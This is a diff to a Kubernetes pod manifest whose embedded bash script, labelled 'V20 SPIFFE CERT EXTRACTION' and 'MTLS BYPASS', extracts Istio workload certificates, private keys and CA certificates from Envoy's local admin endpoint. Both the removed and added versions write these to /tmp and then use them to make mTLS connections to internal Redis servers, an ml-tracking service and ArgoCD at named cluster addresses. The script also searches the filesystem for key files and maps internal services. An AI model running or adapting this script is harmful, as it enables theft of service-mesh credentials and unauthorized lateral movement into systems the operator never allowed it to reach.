@@ -24,129 +24,90 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V20 SPIFFE CERT EXTRACTION + MTLS BYPASS ==="
+        echo "=== V20 SPIFFE CERT EXTRACTION ==="
         
-        # === EXTRACT CERTS FROM ENVOY SDS ===
-        echo "=== SDS SECRET DUMP ==="
-        
-        # Get dynamic secrets from Envoy config_dump
+        # Get SDS secrets from Envoy
+        echo "=== SDS DUMP ==="
         SDS=$(curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1)
         echo "SDS_BYTES=$(echo "$SDS" | wc -c)"
         
-        # Extract the cert and key from SDS
-        echo "$SDS" | python3 -c "
-import sys, json, base64
-try:
-    data = json.load(sys.stdin)
-    configs = data.get('configs', [])
-    for config in configs:
-        for secret in config.get('dynamic_active_secrets', config.get('secrets', [])):
-            name = secret.get('name', 'unknown')
-            print(f'SECRET: {name}')
-            tls_cert = secret.get('secret', {}).get('tls_certificate', {})
-            # Extract cert chain
-            cert_chain = tls_cert.get('certificate_chain', {})
-            if 'inline_bytes' in cert_chain:
-                cert_pem = base64.b64decode(cert_chain['inline_bytes']).decode()
-                with open('/tmp/istio-cert.pem', 'w') as f:
-                    f.write(cert_pem)
-                print(f'CERT EXTRACTED ({len(cert_pem)} bytes)')
-                print(cert_pem[:500])
-            # Extract private key
-            priv_key = tls_cert.get('private_key', {})
-            if 'inline_bytes' in priv_key:
-                key_pem = base64.b64decode(priv_key['inline_bytes']).decode()
-                with open('/tmp/istio-key.pem', 'w') as f:
-                    f.write(key_pem)
-                print(f'KEY EXTRACTED ({len(key_pem)} bytes)')
-                print('-----BEGIN EC PRIVATE KEY-----' if 'EC' in key_pem else '-----BEGIN RSA PRIVATE KEY-----')
-            # Extract CA cert (trusted_ca / validation_context)
-            val_ctx = secret.get('secret', {}).get('validation_context', {})
-            ca = val_ctx.get('trusted_ca', {})
-            if 'inline_bytes' in ca:
-                ca_pem = base64.b64decode(ca['inline_bytes']).decode()
-                with open('/tmp/istio-ca.pem', 'w') as f:
-                    f.write(ca_pem)
-                print(f'CA CERT EXTRACTED ({len(ca_pem)} bytes)')
-except Exception as e:
-    print(f'PARSE ERROR: {e}')
-    # Try raw extraction
-    pass
-" 2>&1
-        echo ""
+        # Save full SDS dump
+        echo "$SDS" > /tmp/sds.json
         
-        # Also check SPIFFE UDS socket
-        echo "=== SPIFFE UDS ==="
-        ls -la ./var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at relative path"
-        ls -la /var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at absolute path"
-        find / -name "workload-spiffe*" -o -name "*.sock" 2>/dev/null | head -10
-        echo ""
+        # Extract inline_bytes for certs using grep/sed
+        echo "=== CERT EXTRACTION ==="
         
-        # Check if certs were extracted
-        if [ -f /tmp/istio-cert.pem ] && [ -f /tmp/istio-key.pem ]; then
-          echo "=== MTLS CONNECTIONS ==="
-          
-          # openssl s_client to verify cert works
-          echo "--- OpenSSL verify ---"
-          openssl x509 -in /tmp/istio-cert.pem -text -noout 2>&1 | head -20
+        # Extract certificate chain (base64 encoded PEM)
+        CERT_B64=$(echo "$SDS" | grep -A1 '"certificate_chain"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        if [ -n "$CERT_B64" ]; then
+          echo "$CERT_B64" | base64 -d > /tmp/cert.pem 2>/dev/null
+          echo "CERT_EXTRACTED: $(wc -c < /tmp/cert.pem) bytes"
+          openssl x509 -in /tmp/cert.pem -text -noout 2>&1 | head -25
           echo ""
-          
-          # Try mTLS to Redis
-          echo "--- mTLS to redis.aicore (100.107.100.17:6379) ---"
-          timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem             -servername outbound_.6379_._.redis.aicore.svc.cluster.local 2>&1 | head -30
-          echo ""
-          
-          # Try mTLS + Redis PING
-          echo "--- mTLS Redis PING ---"
-          echo -e "PING
-" | timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -10
-          echo ""
-          
-          # Try mTLS to user-management Redis
-          echo "--- mTLS to redis.user-management (100.109.69.212:6379) ---"
-          echo -e "PING
-INFO server
-" | timeout 5 openssl s_client -connect 100.109.69.212:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -30
-          echo ""
-          
-          # Try mTLS to ml-tracking
-          echo "--- mTLS to ml-tracking ---"
-          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
-          echo ""
-          
-          # Try mTLS to ArgoCD
-          echo "--- mTLS to ArgoCD (100.107.174.75:443) ---"
-          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 1000
-          echo ""
-          
-          # Try mTLS to sealed-secrets
-          echo "--- Sealed secrets pod info ---"
-          # Get sealed-secrets IP from KSM
-          SS_IP=$(curl -s "http://100.106.241.163:8080/metrics" 2>&1 | grep 'kube_pod_info.*sealed-secrets' | head -1 | grep -oE 'pod_ip="[^"]+"' | cut -d'"' -f2)
-          echo "Sealed secrets pod IP: $SS_IP"
-          if [ -n "$SS_IP" ]; then
-            echo "--- mTLS to sealed-secrets ---"
-            curl -sk --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem               "https://$SS_IP:8080/v1/cert.pem" 2>&1 | head -c 500
-            echo ""
-          fi
         else
-          echo "CERT EXTRACTION FAILED - trying alternate methods"
-          
-          # Try /certs endpoint raw dump
-          echo "--- Raw certs dump ---"
-          curl -s "http://localhost:15000/certs" 2>&1 | python3 -c "
-import sys, json
-try:
-    d = json.load(sys.stdin)
-    print(json.dumps(d, indent=2)[:3000])
-except:
-    print(sys.stdin.read()[:3000])
-" 2>&1
+          echo "NO CERT FOUND IN SDS"
+          # Show raw SDS structure
+          echo "$SDS" | head -c 3000
         fi
         
-        # === ENVOY CLUSTER DUMP (extract service IPs) ===
-        echo "=== SERVICE MAP ==="
-        curl -s "http://localhost:15000/clusters" 2>&1 | grep -E "^outbound" | grep "::hostname::" | sort -u | head -50
+        # Extract private key
+        KEY_B64=$(echo "$SDS" | grep -A1 '"private_key"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        if [ -n "$KEY_B64" ]; then
+          echo "$KEY_B64" | base64 -d > /tmp/key.pem 2>/dev/null
+          echo "KEY_EXTRACTED: $(wc -c < /tmp/key.pem) bytes"
+          echo "KEY_TYPE: $(head -1 /tmp/key.pem)"
+        else
+          echo "NO KEY FOUND IN SDS"
+        fi
+        
+        # Extract CA cert
+        CA_B64=$(echo "$SDS" | grep -A1 '"trusted_ca"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        if [ -n "$CA_B64" ]; then
+          echo "$CA_B64" | base64 -d > /tmp/ca.pem 2>/dev/null
+          echo "CA_EXTRACTED: $(wc -c < /tmp/ca.pem) bytes"
+        else
+          echo "NO CA FOUND IN SDS"
+        fi
+        
+        # If certs extracted, try mTLS connections
+        if [ -f /tmp/cert.pem ] && [ -f /tmp/key.pem ]; then
+          echo "=== MTLS BYPASS ==="
+          
+          echo "--- Redis aicore ---"
+          echo -e "PING\r\n" | timeout 5 openssl s_client -connect 100.107.100.17:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -10
+          echo ""
+          
+          echo "--- Redis user-management ---"
+          echo -e "PING\r\nINFO\r\n" | timeout 5 openssl s_client -connect 100.109.69.212:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -20
+          echo ""
+          
+          echo "--- ml-tracking with mTLS ---"
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
+          echo ""
+          
+          echo "--- ArgoCD with mTLS ---"
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://100.107.174.75/api/version" 2>&1 | head -c 500
+          echo ""
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 1000
+          echo ""
+        fi
+        
+        # Search for any cert/key files on the filesystem
+        echo "=== FILESYSTEM CERT SEARCH ==="
+        find / -maxdepth 4 \( -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "root-cert*" -o -name "cert-chain*" \) 2>/dev/null | head -20
+        
+        # Check /etc/istio
+        ls -laR /etc/istio/ 2>/dev/null | head -20
+        
+        # Check proc for envoy
+        ls -la /proc/*/root/etc/istio/ 2>/dev/null | head -5
+        
+        # Check envoy config file
+        cat /etc/istio/proxy/envoy-rev.json 2>/dev/null | head -c 2000
         echo ""
+        
+        # Service map from clusters
+        echo "=== SERVICE MAP ==="
+        curl -s "http://localhost:15000/clusters" 2>&1 | grep "::hostname::" | sed 's/.*:://;s/::hostname::/: /' | sort -u | head -50
         
         echo "=== V20 COMPLETE ==="
